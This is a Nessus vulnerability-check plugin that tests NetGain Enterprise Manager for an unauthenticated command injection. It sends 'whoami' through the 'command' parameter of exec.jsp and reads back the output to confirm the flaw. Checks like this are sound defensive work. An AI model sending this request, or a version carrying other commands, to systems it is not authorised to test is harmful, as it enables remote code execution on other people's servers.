#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(97664);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/03/14 16:13:01 $");

  script_osvdb_id(152933);
  script_xref(name:"EDB-ID", value:"41499");

  script_name(english:"NetGain Enterprise Manager Command Injection");
  script_summary(english:"Executes a command on the remote host.");

  script_set_attribute(attribute:"synopsis", value:
"A network monitoring application running on the remote host is
affected by a command injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The NetGain Enterprise Manager application running on the remote host
is affected by a flaw in /u/jsp/tools/exec.jsp due to a failure to
sanitize user-supplied input passed via the 'command' parameter. An
unauthenticated, remote attacker can exploit this to execute arbitrary
commands.");
  # https://packetstormsecurity.com/files/141430/NetGain-Enterprise-Manager-7.2.562-Command-Execution.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fa939e13");
  script_set_attribute(attribute:"solution", value:
"Upgrade NetGain Enterprise Manager to version 7.2.586 build 877 or
later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/02/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/03/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/03/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:netgain_systems:netgain_enterprise_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("netgain_enterprise_manager_detect.nbin");
  script_require_ports("Services/www", 8081);
  script_require_keys("installed_sw/NetGain Enterprise Manager");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = "NetGain Enterprise Manager";
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:8081);
install = get_single_install(app_name:appname, port:port);

async_val = 'nessus_' + rand_str(length:8, charset:"0123456789");
requests = make_list(
  "/u/jsp/tools/exec.jsp?command=whoami&argument=&async_output=" + async_val,
  "/u/jsp/tools/async_output.jsp?id=" + async_val);

res = http_send_recv3(item:requests[0], port:port, method:"POST", exit_on_fail:TRUE);
if ("200" >!< res[0])
{
  audit(AUDIT_INST_VER_NOT_VULN, appname, install["version"], install["build"]);
}

res = http_send_recv3(item:requests[1], port:port, method:"GET", exit_on_fail:TRUE);
if ("200" >!< res[0] || "<br />" >!< res[2])
{
  audit(AUDIT_INST_VER_NOT_VULN, appname, install["version"], install["build"]);
}

match = eregmatch(string:res[2], pattern:'[\\r\\n]+([^<]+)<br />');
if (isnull(match) && len(match[1]) > 2)
{
  audit(AUDIT_INST_VER_NOT_VULN, appname, install["version"], install["build"]);
}

security_report_v4(
  port:port,
  severity:SECURITY_HOLE,
  request:requests,
  cmd:"whoami",
  output:match[1]);
